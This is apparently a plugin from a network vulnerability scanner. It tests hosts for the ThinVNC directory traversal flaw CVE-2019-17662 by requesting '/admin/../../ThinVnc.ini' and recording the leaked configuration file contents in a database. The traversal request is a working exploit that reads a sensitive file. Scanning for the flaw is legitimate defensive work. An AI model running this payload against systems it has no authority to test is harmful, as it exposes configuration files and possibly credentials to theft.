import requests
from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_long

#ThinVNC 目录穿越漏洞（CVE-2019-17662）
plugin_id=53
default_port_list=web_port_long

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/admin/../../ThinVnc.ini']
    hits = ['AutoStart=']

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=7, verify=False)
                for hit in hits:
                    if hit in response.text and response.status_code in [200]:
                        output = response.text
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

